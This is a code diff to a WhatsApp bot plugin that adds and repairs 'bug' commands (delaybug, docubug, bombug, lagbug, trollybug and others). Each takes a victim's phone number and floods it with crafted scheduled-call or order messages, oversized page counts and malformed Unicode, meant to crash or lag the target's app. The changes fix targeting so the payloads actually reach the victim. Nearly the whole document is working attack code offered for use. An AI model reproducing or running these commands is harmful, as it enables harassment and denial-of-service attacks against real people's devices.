@@ -21,6 +21,8 @@ const reaction = '😈';
 const mess = {};
 mess.prem = "You are not authorised to use this  command !!!";
 
+const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
+
 const timewisher = (time) => {
   if(time < "23:59:00"){
     return `Good Night 🌆`;
@@ -42,15 +44,14 @@ const timewisher = (time) => {
   } 
 };
 
-async function sendbug(dest, zk, repondre, amount, victims){
+async function sendbug(dest, zk, ms, repondre, amount, victims){
     const bug = `${bugtext1}`;
-    const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
     for (let i = 0; i < victims.length; i++){
       if (!phoneRegex.test(victims[i])){
         repondre(`${victims[i]} not a valid phone number`);
         continue;
       } else {
-        const victim = victims[1] + '@s.whatsapp.net';
+        const victim = victims[i] + '@s.whatsapp.net';
         for (let j = 0; j < amount; j++){
           var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
             "scheduledCallCreationMessage": {
@@ -136,8 +137,8 @@ docugcbug <grouplink>${mono}`;
             showAdAttribution: true,
             title: `${conf.BOT}`,
             body: `Bot Created By ${conf.OWNER_NAME}`,
-            Abhinail: {url: tumbUrl},
-            AbhinailUrl: tumbUrl,
+            thumbnail: {url: tumbUrl},
+            thumbnailUrl: tumbUrl,
             previewType: 'PHOTO',
             sourceUrl: 'https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g',
             mediaType: 1,
@@ -149,7 +150,7 @@ docugcbug <grouplink>${mono}`;
     break;
   }
   }
-  );
+);
 
 
 //docbug 
@@ -175,8 +176,8 @@ zokou(
           mimetype: '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9',
           title: 'bx.pdf',
           pageCount: 9999999999,
-          thumbnail: { url: 'https://cataas.com/cat' },
-          jpegThumbnail: { url: 'https://cataas.com/cat' },
+          thumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
+          jpegThumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
           mediaKey: 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
           fileName:
             '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n' +
@@ -185,14 +186,14 @@ zokou(
       }
       await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
     }
-    );
+);
 
 //loccrash
 zokou(
     {
       nomCom: 'loccrash',
       reaction: '\uD83D\uDD16',
-      categorie: 'dev'
+      categorie: category
     },
     
     async (dest, zk, commandOptions) => {
@@ -214,7 +215,7 @@ zokou(
       }
       await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
     }
-  );
+);
   
 // amountbug
 zokou(
@@ -242,13 +243,19 @@ zokou(
       "callType": "2",
       "scheduledTimestampMs": `${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
       "title": bug,}}), { userJid: dest, quoted : ms});
-    zk.relayMessage(dest, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        try {
+            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs`);
+            console.log(`An error occured while sending bugs: ${e}`);
+            return;
+        }
     await delay(3000);
     }
     await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
     await react(dest, zk, ms, '✅');
   }
-  );
+);
 
 //pmbug
 zokou(
@@ -263,7 +270,7 @@ zokou(
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}pmbug amount\n> Example ${prefixe}pmbug 30|${conf.NUMERO_OWNER} or ${prefixe}pmbug ${conf.NUMERO_OWNER}`);
+      return await repondre(`Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${conf.NUMERO_OWNER} or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
     const text = arg.join('');
     let amount = 30;
@@ -272,7 +279,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, repondre, amount, victims);
+        await sendbug(dest, zk, ms, repondre, amount, victims);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -287,7 +294,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, repondre, amount, victims);
+            await sendbug(dest, zk, ms, repondre, amount, victims);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -302,4 +309,279 @@ zokou(
   }
   );
   
+//delaybug
+zokou(
+  {
+    nomCom: 'delaybug',
+    categorie: category,
+    reaction: reaction
+  },
   
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser,prefixe } = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}delaybug number\n> Example ${prefixe}delaybug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const victim = arg[0].trim() + '@s.whatsapp.net';
+    const amount = 30;
+    const bug = bugtext2;
+    if (!phoneRegex.test(arg[0].trim())){
+        return await repondre(`${arg[0]} not a valid phone number`);
+    } else {
+      for (let i = 0; i < amount; i++){
+        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "scheduledCallCreationMessage": {
+              "callType": "2",
+              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+              "title": bug,
+            }
+        }), { userJid: dest, quoted : ms});
+        try {
+            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs to ${arg[0]}`);
+            await react(dest, zk, ms, '⚠️');
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            return;
+        }
+        await delay(3000);
+      }
+      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
+      await react(dest, zk, ms, '✅');
+    }
+  }
+);
+
+//docubug
+zokou(
+  {
+    nomCom: 'docubug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}docubug amount\n> Example ${prefixe}docubug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const victim = arg[0].trim() + '@s.whatsapp.net';
+    const amount = 15;
+    const bug = `${bugtext1}`;
+    if (!phoneRegex.test(arg[0].trim())){
+      return await repondre(`${arg[0]} not a valid phone number`);
+    } else {
+      for (let i = 0; i < amount; i++){
+        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "scheduledCallCreationMessage": {
+              "callType": "2",
+              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+              "title": bug,
+            }
+        }), { userJid: dest, quoted : ms});
+        try {
+            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs to ${arg[0]}`);
+            await react(dest, zk, ms, '⚠️');
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            return;
+        }
+        await delay(3000);
+      }
+      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
+      await react(dest, zk, ms, '✅');
+    }
+  }
+);
+
+//unlimitedbug
+zokou(
+  {
+    nomCom: 'unlimitedbug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}unlimitedbug amount\n> Example ${prefixe}unlimitedbug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const victim = arg[0].trim() + '@s.whatsapp.net';
+    const amount = 30;
+    const bug = bugtext3;
+    if (!phoneRegex.test(arg[0].trim())){
+      return await repondre(`${arg[0]} not a valid phone number`);
+    } else {
+      for (let i = 0; i < amount; i++){
+        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "scheduledCallCreationMessage": {
+              "callType": "2",
+              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+              "title": bug,
+            }
+        }), { userJid: dest, quoted : ms});
+        try {
+            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs to ${arg[0]}`);
+            await react(dest, zk, ms, '⚠️');
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            return;
+        }
+        await delay(3000);
+      }
+      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
+      await react(dest, zk, ms, '✅');
+    }
+  }
+);
+
+//bombug
+zokou(
+  {
+    nomCom: 'bombug',
+    categorie: category,
+    reaction: reaction
+  },
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}bombug amount\n> Example ${prefixe}bombug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const victim = arg[0].trim() + '@s.whatsapp.net';
+    const amount = 30;
+    const bug = bugtext4;
+    if (!phoneRegex.test(arg[0].trim())){
+      return await repondre(`${arg[0]} not a valid phone number`);
+    } else {
+      for (let i = 0; i < amount; i++){
+        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "scheduledCallCreationMessage": {
+              "callType": "2",
+              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+              "title": bug,
+            }
+        }), { userJid: dest, quoted : ms});
+        try {
+            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs to ${arg[0]}`);
+            await react(dest, zk, ms, '⚠️');
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            return;
+        }
+        await delay(3000);
+      }
+      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
+      await react(dest, zk, ms, '✅');
+    }
+  }
+);
+
+//lagbug
+zokou(
+  {
+    nomCom: 'lagbug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}lagbug amount\n> Example ${prefixe}lagbug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const victim = arg[0].trim() + '@s.whatsapp.net';
+    const amount = 30;
+    const bug = bugtext2;
+    if (!phoneRegex.test(arg[0].trim())){
+      return await repondre(`${arg[0]} not a valid phone number`);
+    } else {
+      for (let i = 0; i < amount; i++){
+        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "scheduledCallCreationMessage": {
+              "callType": "2",
+              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+              "title": bug,
+            }
+        }), { userJid: dest, quoted : ms});
+        try {
+            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs to ${arg[0]}`);
+            await react(dest, zk, ms, '⚠️');
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            return;
+        }
+        await delay(3000);
+      }
+      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
+      await react(dest, zk, ms, '✅');
+    }
+  }
+);
+
+//trollybug
+zokou(
+  {
+    nomCom: 'trollybug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}trollybug amount\n> Example ${prefixe}trollybug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const victim = arg[0].trim() + '@s.whatsapp.net';
+    const amount = 15;
+    if (!phoneRegex.test(arg[0].trim())){
+      return await repondre(`${arg[0]} not a valid phone number`);
+    } else {
+      for (let i = 0; i < amount; i++){
+        var order = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "orderMessage": {
+              "orderId": "599519108102353",
+              "thumbnail": { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
+              "itemCount": 1999,
+              "status": "INQUIRY",
+              "surface": "CATALOG",
+              "message": `${conf.BOT}`,
+              "orderTitle": " TROLLY BUG ", 
+              "sellerJid": "263785028126@s.whatsapp.net",
+              "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+            }
+        }), { userJid: dest, quoted : ms});
+        try {
+            await zk.relayMessage(victim, order.message, { messageId: order.key.id });
+        } catch (e) {
+            await repondre(`An error occured while sending bugs to ${arg[0]}`);
+            await react(dest, zk, ms, '⚠️');
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            return;
+        }
+        await delay(3000);
+      }
+      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
+      await react(dest, zk, ms, '✅');
+    }
+  }
+);
+
+//gcbug
